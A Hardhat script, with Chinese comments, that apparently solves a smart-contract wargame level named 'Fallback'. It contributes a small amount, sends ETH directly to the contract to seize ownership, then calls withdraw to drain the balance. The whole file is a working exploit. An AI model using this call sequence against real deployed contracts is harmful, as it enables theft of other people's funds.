const { ethers } = require("hardhat");

// 合约地址
const FallbackAddress = "0xFFc48Ad0463E4011a4274f4AfE483992D0463910";
async function FallbackScript() {
    const [hacker] = await ethers.getSigners();
    console.log("Hacker address:", hacker.address);
    const fallback = await ethers.getContractAt("Fallback", FallbackAddress);

    console.log("Tx before\n");
    console.log("Fallback owner:", await fallback.owner());
    console.log("Hacker balance:", await ethers.provider.getBalance(hacker.address));
    console.log("Fallback balance:", await ethers.provider.getBalance(FallbackAddress));

    let tx;
    // 黑客向合约贡献1 ETH
    tx = await fallback.contribute({value: 1});
    await tx.wait();

    // 黑客向合约发送1 ETH
    tx = await hacker.sendTransaction({to: fallback.target, value: 1});
    await tx.wait();

    // 黑客提取合约中的所有ETH
    tx = await fallback.withdraw();
    await tx.wait();

    console.log("Tx after\n");
    console.log("Fallback owner:", await fallback.owner());
    console.log("Hacker balance:", await ethers.provider.getBalance(hacker.address));
    console.log("Fallback balance:", await ethers.provider.getBalance(FallbackAddress));
}


FallbackScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});  